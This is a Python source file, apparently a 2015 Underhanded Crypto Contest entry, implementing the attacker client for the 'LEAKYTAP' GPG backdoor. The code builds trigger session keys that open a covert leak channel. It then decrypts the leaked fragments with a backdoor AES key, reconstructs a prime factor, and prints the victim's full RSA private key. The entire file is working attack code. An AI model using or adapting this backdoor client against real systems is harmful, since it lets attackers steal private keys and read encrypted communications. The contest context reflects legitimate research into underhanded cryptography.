#!/usr/bin/env python

"""
Contest: Underhanded Crypto Contest (UCC) 2015
Name: LEAKYTAP
Module: Backdoor client
Author: Jos Wetzels 
License: AGPL-V3
"""

import argparse
from math import log
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES
from Crypto import Random
from Crypto.Random import random

class LEAKYTAP:
	def __init__(self, attacker_key, target_session_key_len, target_factor_size, channel_bandwith):
		
		if(target_session_key_len < 32):
			raise Exception("[-]Targets with session key size < 256 bit currently not supported")

		if(channel_bandwith < 32):
			raise Exception("[-]Use a session key size of 256 bits for maximum channel bandwith")

		self.attacker_key = attacker_key
		self.target_session_key_len = target_session_key_len
		self.target_factor_size = target_factor_size
		self.channel_bandwith = channel_bandwith
		return

	def egcd(self, a, b):
		if (a == 0):
			return (b, 0, 1)
		else:
			g, y, x = self.egcd(b % a, a)
			return (g, x - (b // a) * y, y)

	def modular_inverse(self, a, m):
		g, x, y = self.egcd(a, m)
		if (g != 1):
			raise Exception("[-]No modular multiplicative inverse of %d under modulus %d" % (a, m))
		else:
			return x % m

	def getPrivate(self, n, e, p, q):
		d = self.modular_inverse(e, (p-1)*(q-1))
		return RSA.construct((n, e, d, p, q, ))

	def extract_leak(self, ciphertext, attacker_iv):	
		crypt = AES.new(self.attacker_key, AES.MODE_CBC, attacker_iv)
		return crypt.decrypt(ciphertext)

	def build_leak_message(self, leak_fragment, bucket_size):
		iv = Random.new().read(16)
		bucket_byte = chr(random.randint(bucket_size*leak_fragment, (bucket_size*(leak_fragment+1))-1))
		junk = Random.new().read((32 - len(iv) - 1))
		session_key = bucket_byte + iv + junk
		return iv, session_key

	def make_triggers(self):
		msgs = []
		leak_count = self.target_factor_size / self.channel_bandwith
		bucket_size = 256 / leak_count 
		for i in xrange(leak_count):
			msgs.append(self.build_leak_message(i, bucket_size))
		return msgs

	def recover_fragments(self, ciphertext_fragments, ivs):
		plaintext_fragments = []
		for i in xrange(len(ciphertext_fragments)):
			plaintext_fragments.append(self.extract_leak(ciphertext_fragments[i].decode('hex'), ivs[i].decode('hex')))

		plaintext = "".join(plaintext_fragments)
		return plaintext

class GPG_PublicKey:
	def __init__(self, n, e):
		self.n = long(n, 16)
		self.e = long(e, 16)
		
		self.session_key_len = 32
		self.factor_size = (self.number_of_bits(self.n)/16)
		return

	def number_of_bits(self, n):
		return int(log(n, 2)) + 1

class arg_parser(argparse.ArgumentParser):
    def error(self, message):
        print "[-]Error: %s\n" % message
        self.print_help()
        exit()

def get_arg_parser():
	header = "LEAKYTAP GPG backdoor client"

	parser = arg_parser(description=header)	

	parser.add_argument('--target-pubkey', dest='target_pubkey', help='Target public key [n, e] (in hex)', nargs='+', required=True)
	parser.add_argument('--attacker-pubkey', dest='attacker_pubkey', help='Attacker public key [n, e] (in hex)', nargs='+', required=True)

	parser.add_argument('--backdoor-key', dest='attacker_key', help='Backdoor symmetric key (in hex)', required=True)

	parser.add_argument('--build-triggers', dest='build_triggers', help='Generate trigger session keys', action='store_true')
	parser.set_defaults(build_triggers=False)

	parser.add_argument('--get-private-key', dest='recover_fragments', help='Reconstruct private key from leaks', action='store_true')
	parser.set_defaults(recover_fragments=False)

	parser.add_argument('--leaks', dest='leaks', help='in-order list of leak fragments', nargs='+')
	parser.add_argument('--ivs', dest='ivs', help='in-order list of ivs', nargs='+')	
	return parser

def main():
	parser = get_arg_parser()
	args = parser.parse_args()

	if(args.build_triggers and args.recover_fragments):
		raise Exception("[-]Cannot do both actions simultaneously!")

	target_public_key = GPG_PublicKey(args.target_pubkey[0], args.target_pubkey[1])

	attacker_public_key = GPG_PublicKey(args.attacker_pubkey[0], args.attacker_pubkey[1])

	tap = LEAKYTAP(args.attacker_key, target_public_key.session_key_len, target_public_key.factor_size, attacker_public_key.session_key_len)

	if(args.build_triggers):
		# Construct backdoor triggering session keys
		trigger_keys = tap.make_triggers()
		print "[+]Triggers:"
		print "IV || Trigger session key"
		for x in trigger_keys:
			print x[0].encode('hex'), x[1].encode('hex'), "\n"

	elif(args.recover_fragments):
		if (not(args.leaks) or not(args.ivs)):
			raise Exception("[-]Specify leak fragments & ivs")

		# Reconstruct private key from factor and public key
		p = long(tap.recover_fragments(args.leaks, args.ivs).encode('hex'), 16)
		q = target_public_key.n / p
		rsaPubKey = RSA.construct((target_public_key.n, target_public_key.e, ))
		rsaPrivKey = tap.getPrivate(target_public_key.n, target_public_key.e, p, q)

		print "[+]Recovered RSA private key corresponding to GPG public key:"
		print rsaPrivKey.exportKey()

if __name__ == "__main__":	
	main()